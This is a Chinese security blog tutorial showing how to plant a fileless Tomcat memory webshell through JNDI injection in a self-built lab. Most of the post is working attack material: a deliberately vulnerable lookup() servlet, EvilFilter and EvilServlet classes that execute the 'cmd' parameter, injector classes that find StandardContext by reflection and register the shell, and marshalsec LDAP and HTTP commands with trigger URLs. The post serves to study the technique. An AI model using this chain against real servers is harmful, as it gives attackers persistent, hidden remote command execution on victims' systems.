---
title: 原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oEpmDiB2eAAEaIAgcFiEDKCAJAQgU8AVgzfKQA~tplv-dy-vqe2-sr-v2_1920_1205_q80.jpg
categories:
  - - 代码审计
    - 内存马
tags:
  - 代码审计
  - Java
  - JNDI
  - 内存马
  - LDAP
  - Tomcat
abbrlink: c3f7a2d9
date: 2026-04-22 12:00:00
---

# 原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地

## 摘要

本文记录了一次完整的JNDI注入内存马实验，从零开始搭建漏洞靶机环境，模拟攻击端通过LDAP协议远程加载恶意类，最终向目标Tomcat服务器动态注入Filter内存马实现命令执行。文章重点拆解了三个核心问题：恶意Filter对象的字节码传递方案、StandardContext的反射获取链路、以及Filter动态注册的完整流程。

前置阅读：[Filter内存马原理](https://www.cnblogs.com/wrold) | [JNDI与Fastjson基础](https://www.cnblogs.com/wrold)

## 目录

- [什么是JNDI注入](#什么是jndi注入)
- [前提补充：lookup参数怎么玩](#前提补充lookup参数怎么玩)
- [搭建漏洞服务端](#搭建漏洞服务端)
- [搭建攻击端](#搭建攻击端)
- [思路拆解](#思路拆解)
  - [问题一：恶意Filter怎么传过去](#问题一恶意filter怎么传过去)
  - [问题二：StandardContext怎么拿](#问题二standardcontext怎么拿)
  - [问题三：Filter怎么注册](#问题三filter怎么注册)
- [完整代码实现](#完整代码实现)
- [打入内存马](#打入内存马)
- [匿名内部类方案](#匿名内部类方案)
- [Servlet内存马变体](#servlet内存马变体)
- [总结](#总结)

---

## 什么是JNDI注入

JNDI（Java Naming and Directory Interface）是Java提供的统一命名与目录服务API，底层可以对接RMI、LDAP、DNS等协议。

核心入口类是 `InitialContext`，一个典型的存在漏洞的代码片段长这样：

```java
String url = request.getParameter("url");
InitialContext ctx = new InitialContext();
ctx.lookup(url);  // url完全可控 → JNDI注入
```

`lookup()` 的核心逻辑：如果查找到的是一个 `Reference` 对象，JNDI会从Reference指定的 `codebase` 地址远程加载类，并自动实例化。

**这个"自动实例化"就是我们的入口**——只要能控制 `lookup()` 的参数，就能让目标服务器加载并执行我们的恶意类。

---

## 前提补充：lookup参数怎么玩

在写代码之前，先把 `lookup()` 这个参数的完整流程搞清楚，这里涉及到一个经典工具 **marshalsec**。

**被攻击服务器、攻击者的LDAP服务、攻击者的HTTP服务**，三者之间的完整三角关系如下：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422115052594.png)

简单说就是：

- 被攻击服务器执行 `lookup("ldap://x/FilterInject")`，向LDAP服务发起查询
- LDAP服务（marshalsec）返回一个 `Reference` 对象，Reference里告知：**"去这个HTTP地址下载class"**
- 被攻击服务器拿着地址去HTTP服务下载 `FilterInject.class`，下载完本地实例化，构造方法自动执行

注意这里 `lookup` 里写的 `FilterInject` **不是URL路径，而是LDAP里的一个查询key**，marshalsec不在乎这个名字叫什么，统一返回同一个Reference。

### marshalsec做的事情

用的这个命令：

```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#FilterInject" 1099
```

marshalsec在这里扮演的角色就是**那个LDAP服务**，它做了两件事：

1. 在1099端口起一个LDAP服务，监听请求
2. 当有人来查询任意条目时，统一返回一个Reference，Reference里的codebase指向你给的HTTP地址

所以 `http://127.0.0.1:8888/#FilterInject` 这个参数的含义是：

```
http://127.0.0.1:8888/   → HTTP服务地址（python -m http.server起的那个）
#FilterInject            → 要加载的类名
```

### 需要起的服务一共两个

```
第一个：python3 -m http.server 8888
        作用：托管 FilterInject.class 文件
        必须在 FilterInject.class 所在目录下启动

第二个：java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
             "http://127.0.0.1:8888/#FilterInject" 1099
        作用：LDAP服务，负责告诉被攻击方"去哪里下载class"
```

然后触发：

```
http://靶机/vuln?url=ldap://127.0.0.1:1099/FilterInject
                      ↑LDAP服务地址和端口  ↑随便写，marshalsec不care这个名字
                                            （重要的是marshalsec里配置的HTTP地址）
```

### 补充说明

1. **Reference对象的作用**：JNDI协议支持返回 `javax.naming.Reference` 类型的对象，这个对象里可以指定一个外部URL地址，告诉JNDI客户端去那里加载类。
2. **版本限制**：这个攻击链需要目标服务器的JDK版本低于 `8u191`，Oracle在8u191之后将 `com.sun.jndi.ldap.object.trustURLCodebase` 默认设为 `false`，远程类加载就失效了，高版本需要配合反序列化链（如CC链）来绕过。
3. **内存马注入原理**：当服务器下载并实例化 `FilterInject.class` 时，类的构造方法会自动执行，利用这个特性可以在目标服务器上动态注册恶意Filter，实现内存马注入。

---

## 搭建漏洞服务端

新建一个Maven Web项目，结构如下：

```
jndi_shell/
├── src/main/java/com/vuln/
│   └── JNDIServlet.java
├── src/main/webapp/WEB-INF/
│   └── web.xml
└── pom.xml
```

直接创建maven的web骨架：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422100651505.png)

pom.xml添加依赖：

```xml
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>javax.servlet-api</artifactId>
    <version>4.0.1</version>
    <scope>provided</scope>
</dependency>
```

创建目录和文件JNDIServlet，漏洞Servlet核心代码——关键是 `url` 参数完全来自用户输入，不做任何过滤：

```java
package com.vuln;

import javax.naming.InitialContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

// 注解，将当前类标记为一个 Servlet，并指定其访问路径为 /vuln
// 访问 /vuln 时触发该 Servlet
@WebServlet("/vuln")
// 定义 Servlet
public class JNDIServlet extends HttpServlet {
    // 重写父类方法（因为是继承的父类，重写父类方法）
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        // 请求GET /vuln?url=xxx，则 url 的值为 xxx
        String url = req.getParameter("url");
        try {
            // 创建一个 JNDI（Java命名和目录接口）的 InitialContext 对象
            InitialContext ctx = new InitialContext();
            // 调用 lookup 方法，该方法会根据传入的名称查找并返回 JNDI 中的绑定对象
            ctx.lookup(url);  // 漏洞点：参数可控
        } catch (Exception e) {
            resp.getWriter().println("error: " + e.getMessage());
        }
    }
}
```

用Tomcat 9部署启动：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102518383.png)

添加工件war exploded：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102448784.png)

更改热加载模式：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102557150.png)

启动后访问 `http://localhost:8080/` 返回正常即环境OK。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102055137.png)

---

## 搭建攻击端

再新建一个独立Java项目作为攻击端，这里存放所有恶意类：

```
Attacker/
├── src/main/java/com/vuln
│   ├── EvilFilter.java       # 恶意Filter（命令执行逻辑）
│   ├── FilterInject.java     # JNDI远程加载的注入类
│   └── ClassToBase64.java    # 辅助工具：类→Base64字符串
└── pom.xml
```

`pom.xml` 引入Javassist（用于字节码操作）和Tomcat相关依赖：

```xml
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.29.2-GA</version>
</dependency>
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>9.0.107</version>
    <scope>provided</scope>
</dependency>
```

---

## 思路拆解

在写具体代码之前，先把整个攻击流程的障碍点想清楚。

**整体目标**：让被攻击服务器执行 `lookup()`，触发LDAP查询 → LDAP服务（marshalsec）返回Reference告知class地址 → 被攻击服务器去HTTP服务下载 `FilterInject.class` → 本地实例化 → 构造方法自动执行 → Filter内存马注入成功。

构造方法里需要做三件事：

1. 拿到恶意Filter的对象实例
2. 拿到当前Web应用的 `StandardContext` 对象
3. 把Filter动态注册进去

逐一分析怎么实现。

---

### 问题一：恶意Filter怎么传过去

我们的目的就是把filter和注册两段代码上传到服务器。

如果按照以前学过的，把filter写成匿名内部类和注册代码放一起，可以写成一个文件。但是编译的时候会产生两个文件：`FilterInject.class` 和 `FilterInject$EvilFilter.class`，这样上传的话两个文件都要放到HTTP服务上才行。

这里可能有个疑问：需不需要调用两次 `lookup`？

```
lookup("ldap://127.0.0.1:1099/FilterInject")  ← 只有这一次

JVM加载FilterInject时发现依赖内部类
→ 自动向HTTP服务发第二次请求要FilterInject$EvilFilter.class
→ 这个过程是ClassLoader自动触发的，跟lookup没关系


```

所以：

- lookup调用次数：**1次**
- HTTP服务被请求次数：**2次**

python HTTP服务日志里能看到两条GET记录，一条取 `FilterInject.class`，一条取 `FilterInject$EvilFilter.class`，RCE效果是一样的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422153303399.png)

也有只上传一个文件的方法，就是单独写一个EvilFilter文件，把它编译后的class转换成Base64，再在FilterInject的构造方法中，注册Filter之前先把Base64还原并加载EvilFilter类。但是因为原Tomcat服务器里面是没有EvilFilter这个类的，直接加载会报错，所以需要用到 `ClassLoader` 的 `defineClass` 方法把字节码还原成 `Class` 对象。

这里可能会有个问题：为什么EvilFilter需要用 `defineClass`，为什么上传FilterInject的时候不用也能直接被加载？

其实FilterInject也用了defineClass，只不过是JDK帮你调的。EvilFilter是在FilterInject内部用到的，不会自己加载，需要自己用defineClass手动还原。

```
FilterInject 的加载流程（JDK自动）：
InitialContext.lookup()
→ LDAP客户端收到Reference
→ NamingManager.getObjectInstance()
→ VersionHelper.loadClass()
→ URLClassLoader.findClass()
→ URLClassLoader.defineClass()  ← 在这里，JDK内部自动调的
→ 实例化FilterInject

EvilFilter 的加载流程（手动）：
构造方法执行到一半，需要EvilFilter
→ 没有人帮你去下载，没有人帮你调defineClass
→ 只有你自己通过反射手动调
```

`ClassLoader` 有一个 `protected` 的 `defineClass()` 方法，入参是字节数组，可以直接把字节码还原成 `Class` 对象。因为是 `protected`，只能用反射调用。

---

### 问题二：StandardContext怎么拿

上一篇有讲过的，这里简单过一下。

要动态注册Filter，必须拿到 `StandardContext`（Tomcat中代表一个Web应用的核心上下文对象）。

通过调试发现，`Thread.currentThread().getContextClassLoader()` 在Tomcat环境下返回的是 `ParallelWebappClassLoader` 对象。可以发现其父类 `WebappClassLoaderBase` 中有一个 `resources` 字段，类型是 `WebResourceRoot` 接口，实际实例是 `StandardRoot`。而 `StandardRoot` 中有一个 `context` 字段，就是我们要的 `StandardContext`！

完整反射链：

```java
Thread.currentThread().getContextClassLoader()
    → ParallelWebappClassLoader
        → (父类) WebappClassLoaderBase.resources  [WebResourceRoot/StandardRoot]
            → StandardRoot.context  [StandardContext] ✓
```

实现代码：

```java
// 获取类加载器并强转
ClassLoader cl = Thread.currentThread().getContextClassLoader();
ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;

// 向上遍历父类，找到 resources 字段
Field resourcesField = getFieldFromHierarchy(pwcl.getClass(), "resources");
resourcesField.setAccessible(true);
Object resources = resourcesField.get(pwcl);

// 从 StandardRoot 中反射取出 context
StandardContext standardContext = extractContext(resources);
```

遍历父类查找字段的辅助方法（因为 `resources` 在父类中，`getDeclaredField` 只查当前类，所以要循环往上找）：

```java
private static Field getFieldFromHierarchy(Class<?> clazz, String fieldName) {
    while (clazz != null) {
        try {
            return clazz.getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            clazz = clazz.getSuperclass();  // 找不到就去父类找
        }
    }
    return null;
}
```

从 `StandardRoot` 提取 `StandardContext`：

```java
private static StandardContext extractContext(Object resources) throws Exception {
    if (resources instanceof StandardRoot) {
        StandardRoot standardRoot = (StandardRoot) resources;
        Field contextField = standardRoot.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        Object ctx = contextField.get(standardRoot);
        if (ctx instanceof StandardContext) {
            return (StandardContext) ctx;
        }
    }
    return null;
}
```

---

### 问题三：Filter怎么注册

这部分直接参考Filter内存马的标准注册流程，三步走：

```java
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("shell");
filterDef.setFilter(evilFilter);
filterDef.setFilterClass(evilFilter.getClass().getName());

FilterMap filterMap = new FilterMap();
filterMap.setFilterName("shell");
filterMap.addURLPattern("/*");  // 拦截所有请求

standardContext.addFilterDef(filterDef);
standardContext.addFilterMap(filterMap);
standardContext.filterStart();  // 激活，使Filter生效，代替了之前写的FilterConfig的反射写入
```

---

## 完整代码实现

### 恶意Filter：EvilFilter.java

执行cmd参数的命令，把结果写回response（和以前学过的完全一样就不赘述了）：

```java
import javax.servlet.*;
import javax.servlet.http.HttpFilter;
import java.io.*;

public class EvilFilter extends HttpFilter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            response.getWriter().print(sb.toString());
            return;  // 不向下传递，直接返回结果
        }
        chain.doFilter(request, response);
    }
}
```

### 辅助工具：ClassToBase64.java

先把 `EvilFilter.java` 编译成 `.class`，再运行这个工具，把EvilFilter转成Base64字符串，输出的字符串复制备用：

```java
package com.vuln;

import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class ClassToBase64 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("com.vuln.EvilFilter");  // 通过类名获取
        byte[] bytecode = ctClass.toBytecode();             // 转为字节数组
        System.out.println(Base64.getEncoder().encodeToString(bytecode));
    }
}
```

### 注入类：FilterInject.java

接下来就是读取class并还原加载，然后获取StandardContext注册Filter，再搭建JNDI的下载环境给服务器。把上面三个问题的解决方案全部整合到构造方法里：

```java
package com.vuln;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.Filter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class FilterInject {

    public FilterInject() throws Exception {
        // ① 获取 StandardContext
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;

        Field resourcesField = getFieldFromHierarchy(pwcl.getClass(), "resources");
        resourcesField.setAccessible(true);
        Object resources = resourcesField.get(pwcl);
        StandardContext standardContext = extractContext(resources);

        // ② 还原 EvilFilter 对象
        // Base64字符串解码回字节数组
        String b64 = "yv66vgAAADQ...（此处替换为 ClassToBase64 输出的字符串）";
        byte[] classBytes = Base64.getDecoder().decode(b64);

        // 通过反射调用 ClassLoader.defineClass() 还原 Class 对象
        Method defineClass = ClassLoader.class.getDeclaredMethod(
            "defineClass", byte[].class, int.class, int.class
        );
        defineClass.setAccessible(true);
        Class<?> filterClass = (Class<?>) defineClass.invoke(cl, classBytes, 0, classBytes.length);
        // 实例化得到 Filter 对象（这里也是反射）
        Filter evilFilter = (Filter) filterClass.getDeclaredConstructor().newInstance();

        // ③ 注册 Filter 到 StandardContext
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(evilFilter);
        filterDef.setFilterClass(evilFilter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        standardContext.addFilterDef(filterDef);
        standardContext.addFilterMap(filterMap);
        // 激活，使Filter生效，代替了之前写的FilterConfig的反射写入
        standardContext.filterStart();

        System.out.println("[+] Filter memory shell injected!");
    }

    private static Field getFieldFromHierarchy(Class<?> clazz, String name) {
        while (clazz != null) {
            try { return clazz.getDeclaredField(name); }
            catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); }
        }
        return null;
    }

    private static StandardContext extractContext(Object resources) throws Exception {
        if (resources instanceof StandardRoot) {
            StandardRoot sr = (StandardRoot) resources;
            Field f = sr.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object ctx = f.get(sr);
            if (ctx instanceof StandardContext) return (StandardContext) ctx;
        }
        return null;
    }
}
```

---

## 打入内存马

攻击端环境准备三件事。

这里遇到了个小问题，因为编译时写的代码包含了包名，所以HTTP服务必须严格按照包名目录结构来放class文件，才能让被攻击服务器正确加载到。(建议不要写包名)

**1. 编译 `FilterInject.java` 得到 `.class` 文件**

**2. 用Python在classes根目录（class文件的根目录）启一个HTTP服务**，让LDAP服务器能取到这个类文件：

```bash
E:\WWW\jndi_shell_attacker\target\classes
>>> python -m http.server 8888
```

**3. 启动LDAP服务**，指向HTTP服务的 `FilterInject` 类：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#com.vuln.FilterInject" 1899
```

然后触发漏洞——访问靶机漏洞URL，url参数指向我们的LDAP服务：

```
http://localhost:8080/vuln?url=ldap://127.0.0.1:1899/FilterInject
```

LDAP服务返回Reference，被攻击服务器向Python HTTP服务请求 `FilterInject.class`，Python服务日志确认类文件被成功获取（左边是python右边是marshalsec）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422132926495.png)

服务端控制台打印注入成功信息：

访问任意路径带上 `cmd` 参数，命令执行成功：

```
http://localhost:8080/sfdsdf?cmd=ipconfig
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422133448999.png)

重启Tomcat重新访问报错404，证明刚才的内存马确实是驻留在内存中的，重启之后就消失了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422133554390.png)

---

## 匿名内部类方案

上面用的是Base64方案（只上传一个class文件），也可以直接把EvilFilter写成匿名内部类，和注册代码放在一起，这样就不需要ClassLoader.defineClass()了，代码更直观。但代价是编译后会产生两个class文件，HTTP服务上要同时放 `FilterInject_2.class` 和 `FilterInject_2$1.class`，lookup还是只调一次，JVM会自动去请求内部类的class文件。

直接给POC：

```java
package com.vuln;

import javax.servlet.*;
import java.io.*;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import java.lang.reflect.Field;

public class FilterInject_2 {

    public FilterInject_2() throws Exception {
        // 获取 StandardContext
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;
        Field resourcesField = getFieldFromHierarchy(pwcl.getClass(), "resources");
        resourcesField.setAccessible(true);
        Object resources = resourcesField.get(pwcl);
        StandardContext standardContext = extractContext(resources);

        // 匿名内部类直接写，也不需要用ClassLoader.defineClass()了
        Filter evilFilter = new Filter() {
            @Override
            public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
                    throws IOException, ServletException {
                String cmd = request.getParameter("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    Process process = Runtime.getRuntime().exec(cmd);
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(process.getInputStream())
                    );
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    response.getWriter().print(sb.toString());
                    return;  // 不向下传递，直接返回结果
                }
                chain.doFilter(request, response);
            }
        };

        // 注册 Filter 到 StandardContext
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(evilFilter);
        filterDef.setFilterClass(evilFilter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        standardContext.addFilterDef(filterDef);
        standardContext.addFilterMap(filterMap);
        // 激活，使Filter生效
        standardContext.filterStart();

        System.out.println("[+] Filter memory shell injected!");
    }

    private static Field getFieldFromHierarchy(Class<?> clazz, String name) {
        while (clazz != null) {
            try { return clazz.getDeclaredField(name); }
            catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); }
        }
        return null;
    }

    private static StandardContext extractContext(Object resources) throws Exception {
        if (resources instanceof StandardRoot) {
            StandardRoot sr = (StandardRoot) resources;
            Field f = sr.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object ctx = f.get(sr);
            if (ctx instanceof StandardContext) return (StandardContext) ctx;
        }
        return null;
    }
}
```

---

## Servlet内存马变体

思路完全一样，只是把"注册Filter"换成"注册Servlet"，再举例一个。

### EvilServlet.java

```java
package com.vuln;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class EvilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            byte[] bytes = baos.toByteArray();
            resp.getWriter().write(new String(bytes, "GBK"));
            return;
        }
        resp.getWriter().write("Servlet is running...");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        doGet(req, resp);
    }
}
```

### ServletInject.java

StandardContext的获取方式完全不变，区别只在于注册部分——Filter用的是FilterDef+FilterMap，Servlet用的是StandardWrapper：

```java
package com.vuln;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;
import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.catalina.webresources.StandardRoot;
import javax.servlet.Servlet;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class ServletInject {

    public ServletInject() throws Exception {
        // 获取 StandardContext（和Filter注入完全一样）
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;
        Field resourcesField = getFieldFromHierarchy(pwcl.getClass(), "resources");
        resourcesField.setAccessible(true);
        Object resources = resourcesField.get(pwcl);
        StandardContext standardContext = extractContext(resources);

        // 还原 EvilServlet 对象
        String b64 = "......";  // 替换为EvilServlet的Base64字符串
        byte[] classBytes = Base64.getDecoder().decode(b64);

        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
        );
        defineClass.setAccessible(true);
        Class<?> servletClass = (Class<?>) defineClass.invoke(cl, classBytes, 0, classBytes.length);
        Servlet evilServlet = (Servlet) servletClass.getDeclaredConstructor().newInstance();

        // 注册方式和Filter不同，Servlet用StandardWrapper
        // 1. 创建 StandardWrapper 包装 Servlet
        StandardWrapper wrapper = new StandardWrapper();
        wrapper.setName("evilServlet");
        wrapper.setServlet(evilServlet);
        wrapper.setServletClass(evilServlet.getClass().getName());

        // 2. 将 Wrapper 添加到 StandardContext 的子容器中
        standardContext.addChild(wrapper);

        // 3. 添加 URL 映射（和filter不同）
        standardContext.addServletMappingDecoded("/evil", "evilServlet");

        System.out.println("[+] Servlet memory shell injected!");
    }

    private static Field getFieldFromHierarchy(Class<?> clazz, String name) {
        while (clazz != null) {
            try { return clazz.getDeclaredField(name); }
            catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); }
        }
        return null;
    }

    private static StandardContext extractContext(Object resources) throws Exception {
        if (resources instanceof StandardRoot) {
            StandardRoot sr = (StandardRoot) resources;
            Field f = sr.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object ctx = f.get(sr);
            if (ctx instanceof StandardContext) return (StandardContext) ctx;
        }
        return null;
    }
}
```

触发后访问 `http://localhost:8080/evil?cmd=ipconfig` 即可执行命令：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422155052944.png)

其他内存马同理。

---

## 总结

整个JNDI注入内存马的链路：

```
控制 lookup() 参数
    → marshalsec（LDAP服务）返回 Reference
        → 被攻击方从HTTP服务下载恶意class
            → JDK内部自动调用 URLClassLoader.defineClass() 加载
                → 自动调用构造方法
                    → 反射链获取 StandardContext
                    → 手动 defineClass 还原恶意Filter字节码
                    → 反射实例化 Filter 对象
                    → 动态注册到 StandardContext
                    → filterStart() 激活生效
```

核心利用了两个Java特性：

- **JNDI的远程类加载机制**：Reference + codebase 实现远程加载任意类，JDK内部自动走完defineClass整个流程
- **构造方法自动执行**：类实例化时构造函数必然触发，是恶意代码的天然入口

两种恶意Filter传递方案的对比：

| | Base64嵌入方案 | 匿名内部类方案 |
|---|---|---|
| HTTP服务文件数 | 1个 | 2个（主类+内部类） |
| lookup次数 | 1次 | 1次 |
| 代码复杂度 | 高（需要反射defineClass） | 低（直接new匿名类） |
| 原理 | 手动defineClass还原EvilFilter | JVM自动加载内部类class |

既然Filter和Servlet都能注入，Listener、Valve、Agent内存马也同理，换对应的注册API就行，后续再写。
